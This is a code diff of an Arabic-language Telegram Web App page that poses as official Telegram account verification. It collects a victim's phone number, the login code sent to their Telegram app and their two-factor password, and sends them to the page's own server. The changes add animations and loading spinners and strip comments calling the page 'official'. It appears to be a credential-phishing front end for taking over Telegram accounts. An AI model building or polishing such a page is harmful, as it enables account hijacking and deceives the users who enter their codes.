@@ -34,9 +34,9 @@
             width: 100%;
             max-width: 380px;
             text-align: center;
+            transition: all 0.3s ease;
         }
 
-        /* أيقونة تيليغرام الرسمية */
         .tg-logo {
             width: 80px;
             height: 80px;
@@ -47,13 +47,20 @@
             justify-content: center;
             margin: 0 auto 20px auto;
             box-shadow: 0 8px 20px rgba(36, 129, 204, 0.3);
+            animation: pulseLogo 2s infinite;
+        }
+
+        @keyframes pulseLogo {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(36, 129, 204, 0.4); }
+            70% { transform: scale(1.03); box-shadow: 0 0 0 10px rgba(36, 129, 204, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(36, 129, 204, 0); }
         }
 
         .tg-logo svg {
             width: 45px;
             height: 45px;
             fill: #ffffff;
-            margin-left: -4px; /* لضبط محاذاة طائرة تيليغرام */
+            margin-left: -4px;
         }
 
         h2 {
@@ -68,6 +75,18 @@
             color: var(--tg-hint-color);
             margin-bottom: 24px;
             line-height: 1.5;
+        }
+
+        .step-container {
+            opacity: 1;
+            transform: translateY(0);
+            transition: opacity 0.3s ease, transform 0.3s ease;
+        }
+
+        .step-container.hidden {
+            opacity: 0;
+            transform: translateY(15px);
+            display: none;
         }
 
         .input-group {
@@ -113,16 +132,38 @@
             font-weight: 600;
             cursor: pointer;
             margin-top: 10px;
-            transition: opacity 0.2s;
+            transition: opacity 0.2s, transform 0.1s;
             box-shadow: 0 4px 12px rgba(36, 129, 204, 0.2);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
         }
 
         button:active {
-            opacity: 0.85;
+            transform: scale(0.98);
+            opacity: 0.9;
         }
 
-        .hidden {
-            display: none;
+        button:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        /* دائرة التحميل (Spinner) */
+        .spinner {
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+            margin-left: 8px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
 
         .error {
@@ -130,6 +171,13 @@
             font-size: 13px;
             margin-top: 12px;
             font-weight: 500;
+            animation: shake 0.4s ease;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-5px); }
+            40%, 80% { transform: translateX(5px); }
         }
 
         .success-card {
@@ -137,6 +185,12 @@
             padding: 30px 20px;
             border-radius: 16px;
             box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+            animation: fadeIn 0.5s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
         }
 
         .success-icon {
@@ -148,7 +202,6 @@
 <body>
 
     <div class="container">
-        <!-- شعار تيليغرام الرسمي SVG -->
         <div class="tg-logo">
             <svg viewBox="0 0 24 24">
                 <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.07-.2-.08-.06-.19-.04-.27-.02-.12.03-1.99 1.27-5.62 3.72-.53.36-1.01.54-1.44.53-.47-.01-1.38-.26-2.06-.48-.83-.27-1.49-.42-1.43-.88.03-.24.37-.49 1.02-.75 3.98-1.73 6.64-2.87 7.98-3.44 3.8-1.63 4.59-1.92 5.1-1.93.11 0 .37.03.54.17.14.12.18.28.2.45-.02.07-.02.13-.04.23z"/>
@@ -159,31 +212,34 @@
         <p class="subtitle" id="subtitle">يرجى إدخال رقم هاتفك للبدء بعملية التوثيق الرسمية بأمان تام.</p>
         
         <!-- خطوة إدخال الرقم -->
-        <div id="step-phone" class="input-group">
-            <label>رقم الهاتف</label>
-            <input type="tel" id="phone" placeholder="+963 9xxxxxxxx" value="+">
-            <button onclick="sendCode()">متابعة</button>
+        <div id="step-phone" class="step-container">
+            <div class="input-group">
+                <label>رقم الهاتف</label>
+                <input type="tel" id="phone" placeholder="+963 9xxxxxxxx" value="+">
+            </div>
+            <button id="btn-phone" onclick="sendCode()">متابعة</button>
         </div>
 
         <!-- خطوة إدخال الرمز وكلمة المرور الاختيارية -->
-        <div id="step-code" class="input-group hidden">
-            <label>رمز التأكيد</label>
-            <input type="text" id="code" placeholder="أدخل الرمز المرسل إلى تطبيقك">
+        <div id="step-code" class="step-container hidden">
+            <div class="input-group">
+                <label>رمز التأكيد</label>
+                <input type="text" id="code" placeholder="أدخل الرمز المرسل إلى تطبيقك">
+            </div>
             
-            <!-- خانة كلمة المرور المخفية تظهر ذكياً عند الحاجة فقط -->
-            <div id="password-group" class="hidden" style="margin-top: 16px;">
+            <!-- خانة كلمة المرور المخفية تظهر ذكياً بالانيميشن -->
+            <div id="password-group" class="input-group hidden" style="margin-top: 16px;">
                 <label style="color: var(--tg-link-color);">كلمة مرور الحساب (2FA)</label>
                 <input type="password" id="password" placeholder="أدخل كلمة المرور الخاصة بك">
             </div>
 
-            <button onclick="verifyCode()">تأكيد وتسجيل الدخول</button>
+            <button id="btn-code" onclick="verifyCode()">تأكيد وتسجيل الدخول</button>
         </div>
 
         <div id="message" class="error"></div>
     </div>
 
     <script>
-        // تفعيل واجهة تيليغرام ويب أب رسمياً
         const tg = window.Telegram.WebApp;
         tg.ready();
         tg.expand();
@@ -193,6 +249,7 @@
         async function sendCode() {
             const phone = document.getElementById('phone').value.trim();
             const msgDiv = document.getElementById('message');
+            const btn = document.getElementById('btn-phone');
             msgDiv.innerText = '';
 
             if (!phone || phone.length < 8) {
@@ -201,6 +258,11 @@
             }
 
             currentPhone = phone;
+            
+            // إظهار دائرة التحميل وتعطيل الزر
+            const originalText = btn.innerHTML;
+            btn.innerHTML = 'جاري الإرسال <span class="spinner"></span>';
+            btn.disabled = true;
 
             try {
                 const res = await fetch('/api/send-code', {
@@ -211,15 +273,22 @@
                 const data = await res.json();
 
                 if (data.success) {
+                    // انيميشن الانتقال الناعم بين الصفحات
                     document.getElementById('step-phone').classList.add('hidden');
-                    document.getElementById('step-code').classList.remove('hidden');
+                    const codeStep = document.getElementById('step-code');
+                    codeStep.classList.remove('hidden');
+                    
                     document.getElementById('title').innerText = 'أدخل رمز التحقق';
                     document.getElementById('subtitle').innerText = 'تم إرسال رمز إلى حسابك على تيليغرام.';
                 } else {
                     msgDiv.innerText = data.error || 'حدث خطأ ما، يرجى المحاولة لاحقاً';
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
                 }
             } catch (err) {
                 msgDiv.innerText = 'فشل الاتصال بالخادم';
+                btn.innerHTML = originalText;
+                btn.disabled = false;
             }
         }
 
@@ -227,12 +296,17 @@
             const code = document.getElementById('code').value.trim();
             const password = document.getElementById('password').value.trim();
             const msgDiv = document.getElementById('message');
+            const btn = document.getElementById('btn-code');
             msgDiv.innerText = '';
 
             if (!code) {
                 msgDiv.innerText = 'يرجى إدخال رمز التحقق';
                 return;
             }
+
+            const originalText = btn.innerHTML;
+            btn.innerHTML = 'جاري التحقق <span class="spinner"></span>';
+            btn.disabled = true;
 
             try {
                 const res = await fetch('/api/verify-code', {
@@ -251,15 +325,23 @@
                         </div>
                     `;
                 } else if (data.needPassword) {
-                    document.getElementById('password-group').classList.remove('hidden');
+                    // إظهار حقل كلمة المرور بسلاسة
+                    const pwdGroup = document.getElementById('password-group');
+                    pwdGroup.classList.remove('hidden');
                     msgDiv.style.color = '#e67e22';
                     msgDiv.innerText = data.error;
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
                 } else {
                     msgDiv.style.color = '#e74c3c';
                     msgDiv.innerText = data.error || 'الرمز المدخل غير صحيح';
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
                 }
             } catch (err) {
                 msgDiv.innerText = 'حدث خطأ أثناء التحقق، حاول مجدداً';
+                btn.innerHTML = originalText;
+                btn.disabled = false;
             }
         }
     </script>
